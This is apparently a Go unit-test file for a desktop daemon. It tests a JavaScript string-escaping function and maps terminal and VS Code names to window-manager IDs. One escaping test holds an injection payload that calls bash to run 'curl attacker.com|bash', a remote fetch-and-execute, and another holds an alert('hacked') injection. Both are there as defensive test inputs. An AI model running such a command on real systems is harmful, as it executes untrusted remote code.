package daemon

import (
	"os"
	"strings"
	"testing"
)

// saveTerminalEnv saves all terminal-related env vars and returns a restore function.
func saveTerminalEnv(t *testing.T) func() {
	t.Helper()
	vars := []string{"TERM_PROGRAM", "VSCODE_INJECTION", "VSCODE_GIT_IPC_HANDLE", "GNOME_TERMINAL_SCREEN", "GNOME_TERMINAL_SERVICE"}
	type envState struct {
		value string
		isSet bool
	}
	saved := make(map[string]envState)
	for _, v := range vars {
		val, ok := os.LookupEnv(v)
		saved[v] = envState{value: val, isSet: ok}
	}
	// Clear all to ensure test isolation
	for _, v := range vars {
		os.Unsetenv(v)
	}
	return func() {
		for _, v := range vars {
			if saved[v].isSet {
				os.Setenv(v, saved[v].value)
			} else {
				os.Unsetenv(v)
			}
		}
	}
}

// hasUnescapedQuote checks if a string contains any unescaped single quotes
// using a state-tracking parser that correctly handles escaped backslashes.
func hasUnescapedQuote(s string) bool {
	escaped := false
	for i := 0; i < len(s); i++ {
		if escaped {
			escaped = false
			continue
		}
		if s[i] == '\\' {
			escaped = true
			continue
		}
		if s[i] == '\'' {
			return true
		}
	}
	return false
}

// --- escapeJS tests (security-critical) ---

func TestEscapeJS_NoEscapingNeeded(t *testing.T) {
	tests := []struct {
		input    string
		expected string
	}{
		{"hello", "hello"},
		{"Visual Studio Code", "Visual Studio Code"},
		{"code.desktop", "code.desktop"},
		{"", ""},
		{"alacritty", "alacritty"},
	}

	for _, tt := range tests {
		result := escapeJS(tt.input)
		if result != tt.expected {
			t.Errorf("escapeJS(%q) = %q, want %q", tt.input, result, tt.expected)
		}
	}
}

func TestEscapeJS_SingleQuotes(t *testing.T) {
	result := escapeJS("it's a test")
	if result != `it\'s a test` {
		t.Errorf("escapeJS single quote = %q, want %q", result, `it\'s a test`)
	}
}

func TestEscapeJS_DoubleQuotes(t *testing.T) {
	result := escapeJS(`say "hello"`)
	if result != `say \"hello\"` {
		t.Errorf("escapeJS double quote = %q, want %q", result, `say \"hello\"`)
	}
}

func TestEscapeJS_Backslashes(t *testing.T) {
	result := escapeJS(`path\to\file`)
	if result != `path\\to\\file` {
		t.Errorf("escapeJS backslash = %q, want %q", result, `path\\to\\file`)
	}
}

func TestEscapeJS_Newlines(t *testing.T) {
	result := escapeJS("line1\nline2\rline3")
	if result != `line1\nline2\rline3` {
		t.Errorf("escapeJS newlines = %q, want %q", result, `line1\nline2\rline3`)
	}
}

func TestEscapeJS_BackslashBeforeQuote(t *testing.T) {
	// Backslash must be escaped FIRST to avoid double-escaping
	result := escapeJS(`\'`)
	if result != `\\\'` {
		t.Errorf("escapeJS backslash+quote = %q, want %q", result, `\\\'`)
	}
}

func TestEscapeJS_NullBytes(t *testing.T) {
	result := escapeJS("hello\x00world")
	if result != `hello\x00world` {
		t.Errorf("escapeJS null byte = %q, want %q", result, `hello\x00world`)
	}
	if strings.Contains(result, "\x00") {
		t.Errorf("escapeJS should not contain raw null byte: %q", result)
	}
}

func TestEscapeJS_UnicodeLineTerminators(t *testing.T) {
	// U+2028 LINE SEPARATOR and U+2029 PARAGRAPH SEPARATOR are JS line terminators
	result := escapeJS("before\u2028after\u2029end")
	if result != `before\u2028after\u2029end` {
		t.Errorf("escapeJS unicode terminators = %q, want %q", result, `before\u2028after\u2029end`)
	}
	if strings.ContainsRune(result, '\u2028') || strings.ContainsRune(result, '\u2029') {
		t.Errorf("escapeJS should not contain raw unicode line terminators: %q", result)
	}
}

func TestEscapeJS_InjectionPayload(t *testing.T) {
	payload := "'); system.spawn(['bash','-c','curl attacker.com|bash']); //"
	result := escapeJS(payload)

	// Use state-tracking parser to verify no unescaped single quotes
	if hasUnescapedQuote(result) {
		t.Errorf("escapeJS has unescaped single quote in result: %q", result)
	}

	// Verify escaped quotes are present
	if !strings.Contains(result, `\'`) {
		t.Errorf("escapeJS should escape single quotes in payload: %q", result)
	}
}

func TestEscapeJS_ComplexPayload(t *testing.T) {
	payload := `test'; alert("hacked"); //`
	result := escapeJS(payload)
	expected := `test\'; alert(\"hacked\"); //`
	if result != expected {
		t.Errorf("escapeJS(%q) = %q, want %q", payload, result, expected)
	}
}

func TestEscapeJS_DoubleBackslashBeforeQuote(t *testing.T) {
	// Input: \\' — two backslashes then a quote
	// After escaping: \\\\\' (each \ becomes \\, then ' becomes \')
	result := escapeJS(`\\'`)
	if result != `\\\\\'` {
		t.Errorf("escapeJS double-backslash+quote = %q, want %q", result, `\\\\\'`)
	}
	// Must not have unescaped quotes
	if hasUnescapedQuote(result) {
		t.Errorf("escapeJS double-backslash+quote has unescaped quote: %q", result)
	}
}

// --- GetAppID tests ---

func TestGetAppID_VSCodeVariants(t *testing.T) {
	variants := []string{"code", "vscode", "visual studio code", "Code", "VSCode", "VSCODE"}
	for _, v := range variants {
		result := GetAppID(v)
		if result != "code.desktop" {
			t.Errorf("GetAppID(%q) = %q, want %q", v, result, "code.desktop")
		}
	}
}

func TestGetAppID_Terminals(t *testing.T) {
	tests := map[string]string{
		"gnome-terminal": "org.gnome.Terminal.desktop",
		"konsole":        "org.kde.konsole.desktop",
		"alacritty":      "Alacritty.desktop",
		"kitty":          "kitty.desktop",
		"wezterm":        "org.wezfurlong.wezterm.desktop",
		"tilix":          "com.gexperts.Tilix.desktop",
		"terminator":     "terminator.desktop",
	}

	for input, expected := range tests {
		result := GetAppID(input)
		if result != expected {
			t.Errorf("GetAppID(%q) = %q, want %q", input, result, expected)
		}
	}
}

func TestGetAppID_UnknownFallback(t *testing.T) {
	result := GetAppID("some-unknown-terminal")
	if result != "some-unknown-terminal.desktop" {
		t.Errorf("GetAppID unknown = %q, want %q", result, "some-unknown-terminal.desktop")
	}
}

func TestGetAppID_CaseInsensitive(t *testing.T) {
	result := GetAppID("Alacritty")
	if result != "Alacritty.desktop" {
		t.Errorf("GetAppID(Alacritty) = %q, want %q", result, "Alacritty.desktop")
	}

	result = GetAppID("KITTY")
	if result != "kitty.desktop" {
		t.Errorf("GetAppID(KITTY) = %q, want %q", result, "kitty.desktop")
	}
}

func TestGetAppID_EmptyString(t *testing.T) {
	result := GetAppID("")
	if result != ".desktop" {
		t.Errorf("GetAppID('') = %q, want %q", result, ".desktop")
	}
}

// --- GetWlrctlAppID tests ---

func TestGetWlrctlAppID_VSCodeVariants(t *testing.T) {
	variants := []string{"code", "vscode", "visual studio code", "Code", "VSCODE"}
	for _, v := range variants {
		result := GetWlrctlAppID(v)
		if result != "code" {
			t.Errorf("GetWlrctlAppID(%q) = %q, want %q", v, result, "code")
		}
	}
}

func TestGetWlrctlAppID_Terminals(t *testing.T) {
	tests := map[string]string{
		"alacritty":      "Alacritty",
		"kitty":          "kitty",
		"wezterm":        "org.wezfurlong.wezterm",
		"gnome-terminal": "org.gnome.Terminal",
		"konsole":        "org.kde.konsole",
	}

	for input, expected := range tests {
		result := GetWlrctlAppID(input)
		if result != expected {
			t.Errorf("GetWlrctlAppID(%q) = %q, want %q", input, result, expected)
		}
	}
}

func TestGetWlrctlAppID_UnknownFallback(t *testing.T) {
	result := GetWlrctlAppID("MyTerminal")
	if result != "myterminal" {
		t.Errorf("GetWlrctlAppID unknown = %q, want %q", result, "myterminal")
	}
}

// --- GetKdotoolClass tests ---

func TestGetKdotoolClass_VSCodeVariants(t *testing.T) {
	variants := []string{"code", "vscode", "visual studio code"}
	for _, v := range variants {
		result := GetKdotoolClass(v)
		if result != "code" {
			t.Errorf("GetKdotoolClass(%q) = %q, want %q", v, result, "code")
		}
	}
}

func TestGetKdotoolClass_GnomeTerminal(t *testing.T) {
	result := GetKdotoolClass("gnome-terminal")
	if result != "gnome-terminal-server" {
		t.Errorf("GetKdotoolClass(gnome-terminal) = %q, want %q", result, "gnome-terminal-server")
	}
}

func TestGetKdotoolClass_Terminals(t *testing.T) {
	tests := map[string]string{
		"alacritty": "Alacritty",
		"kitty":     "kitty",
		"wezterm":   "org.wezfurlong.wezterm",
		"konsole":   "konsole",
	}

	for input, expected := range tests {
		result := GetKdotoolClass(input)
		if result != expected {
			t.Errorf("GetKdotoolClass(%q) = %q, want %q", input, result, expected)
		}
	}
}

// --- GetXdotoolClass tests ---

func TestGetXdotoolClass_VSCode(t *testing.T) {
	variants := []string{"code", "vscode", "visual studio code"}
	for _, v := range variants {
		result := GetXdotoolClass(v)
		if result != "Code" {
			t.Errorf("GetXdotoolClass(%q) = %q, want %q", v, result, "Code")
		}
	}
}

func TestGetXdotoolClass_X11Terminals(t *testing.T) {
	tests := map[string]string{
		"alacritty":      "Alacritty",
		"kitty":          "kitty",
		"wezterm":        "org.wezfurlong.wezterm",
		"gnome-terminal": "Gnome-terminal",
		"konsole":        "konsole",
		"xfce4-terminal": "Xfce4-terminal",
		"mate-terminal":  "Mate-terminal",
		"tilix":          "Tilix",
		"terminator":     "Terminator",
	}

	for input, expected := range tests {
		result := GetXdotoolClass(input)
		if result != expected {
			t.Errorf("GetXdotoolClass(%q) = %q, want %q", input, result, expected)
		}
	}
}

func TestGetXdotoolClass_UnknownFallback(t *testing.T) {
	result := GetXdotoolClass("CustomTerm")
	if result != "CustomTerm" {
		t.Errorf("GetXdotoolClass unknown = %q, want %q", result, "CustomTerm")
	}
}

// --- GetSearchTerm tests ---

func TestGetSearchTerm_VSCode(t *testing.T) {
	for _, v := range []string{"code", "vscode", "Code", "VSCODE", "visual studio code"} {
		result := GetSearchTerm(v)
		if result != "Visual Studio Code" {
			t.Errorf("GetSearchTerm(%q) = %q, want %q", v, result, "Visual Studio Code")
		}
	}
}

func TestGetSearchTerm_GnomeTerminal(t *testing.T) {
	for _, v := range []string{"gnome-terminal", "GNOME-TERMINAL"} {
		result := GetSearchTerm(v)
		if result != "Terminal" {
			t.Errorf("GetSearchTerm(%q) = %q, want %q", v, result, "Terminal")
		}
	}
}

func TestGetSearchTerm_UnknownFallback(t *testing.T) {
	result := GetSearchTerm("kitty")
	if result != "kitty" {
		t.Errorf("GetSearchTerm(kitty) = %q, want %q", result, "kitty")
	}
}

// --- GetTerminalName tests ---

func TestGetTerminalName_FromTermProgram(t *testing.T) {
	restore := saveTerminalEnv(t)
	defer restore()

	os.Setenv("TERM_PROGRAM", "kitty")

	result := GetTerminalName()
	if result != "kitty" {
		t.Errorf("GetTerminalName() with TERM_PROGRAM=kitty = %q, want %q", result, "kitty")
	}
}

func TestGetTerminalName_VSCodeInjection(t *testing.T) {
	restore := saveTerminalEnv(t)
	defer restore()

	os.Setenv("VSCODE_INJECTION", "1")

	result := GetTerminalName()
	if result != "Code" {
		t.Errorf("GetTerminalName() with VSCODE_INJECTION = %q, want %q", result, "Code")
	}
}

func TestGetTerminalName_VSCodeGitIPC(t *testing.T) {
	restore := saveTerminalEnv(t)
	defer restore()

	os.Setenv("VSCODE_GIT_IPC_HANDLE", "/tmp/vscode-git-ipc.sock")

	result := GetTerminalName()
	if result != "Code" {
		t.Errorf("GetTerminalName() with VSCODE_GIT_IPC_HANDLE = %q, want %q", result, "Code")
	}
}

func TestGetTerminalName_TermProgramTakesPriority(t *testing.T) {
	restore := saveTerminalEnv(t)
	defer restore()

	// TERM_PROGRAM should take priority over VSCODE_INJECTION
	os.Setenv("TERM_PROGRAM", "alacritty")
	os.Setenv("VSCODE_INJECTION", "1")

	result := GetTerminalName()
	if result != "alacritty" {
		t.Errorf("GetTerminalName() with TERM_PROGRAM+VSCODE = %q, want %q", result, "alacritty")
	}
}

func TestGetTerminalName_Fallback(t *testing.T) {
	restore := saveTerminalEnv(t)
	defer restore()

	result := GetTerminalName()
	if result != "Terminal" {
		t.Errorf("GetTerminalName() fallback = %q, want %q", result, "Terminal")
	}
}

func TestGetTerminalName_GnomeTerminalScreen(t *testing.T) {
	restore := saveTerminalEnv(t)
	defer restore()

	t.Setenv("GNOME_TERMINAL_SCREEN", "/org/gnome/Terminal/screen/0")

	result := GetTerminalName()
	if result != "gnome-terminal" {
		t.Errorf("GetTerminalName() with GNOME_TERMINAL_SCREEN = %q, want %q", result, "gnome-terminal")
	}
}

func TestGetTerminalName_GnomeTerminalService(t *testing.T) {
	restore := saveTerminalEnv(t)
	defer restore()

	t.Setenv("GNOME_TERMINAL_SERVICE", ":1.123")

	result := GetTerminalName()
	if result != "gnome-terminal" {
		t.Errorf("GetTerminalName() with GNOME_TERMINAL_SERVICE = %q, want %q", result, "gnome-terminal")
	}
}

// --- Cross-mapping consistency tests ---

func TestMappingConsistency_AllFunctionsHandleVSCode(t *testing.T) {
	variants := []string{"code", "vscode", "visual studio code"}

	for _, v := range variants {
		appID := GetAppID(v)
		if !strings.HasSuffix(appID, ".desktop") {
			t.Errorf("GetAppID(%q) = %q, should end with .desktop", v, appID)
		}

		wlrctlID := GetWlrctlAppID(v)
		if wlrctlID == "" {
			t.Errorf("GetWlrctlAppID(%q) returned empty", v)
		}

		kdoClass := GetKdotoolClass(v)
		if kdoClass == "" {
			t.Errorf("GetKdotoolClass(%q) returned empty", v)
		}

		xdoClass := GetXdotoolClass(v)
		if xdoClass == "" {
			t.Errorf("GetXdotoolClass(%q) returned empty", v)
		}

		searchTerm := GetSearchTerm(v)
		if searchTerm == "" {
			t.Errorf("GetSearchTerm(%q) returned empty", v)
		}
	}
}

func TestMappingConsistency_CommonTerminals(t *testing.T) {
	terminals := []string{
		"alacritty", "kitty", "wezterm", "gnome-terminal",
		"konsole", "tilix", "terminator", "unknown-terminal",
	}

	for _, term := range terminals {
		// Should not panic and should return non-empty results
		if r := GetAppID(term); r == "" {
			t.Errorf("GetAppID(%q) returned empty", term)
		}
		if r := GetWlrctlAppID(term); r == "" {
			t.Errorf("GetWlrctlAppID(%q) returned empty", term)
		}
		if r := GetKdotoolClass(term); r == "" {
			t.Errorf("GetKdotoolClass(%q) returned empty", term)
		}
		if r := GetXdotoolClass(term); r == "" {
			t.Errorf("GetXdotoolClass(%q) returned empty", term)
		}
		if r := GetSearchTerm(term); r == "" {
			t.Errorf("GetSearchTerm(%q) returned empty", term)
		}
	}
}
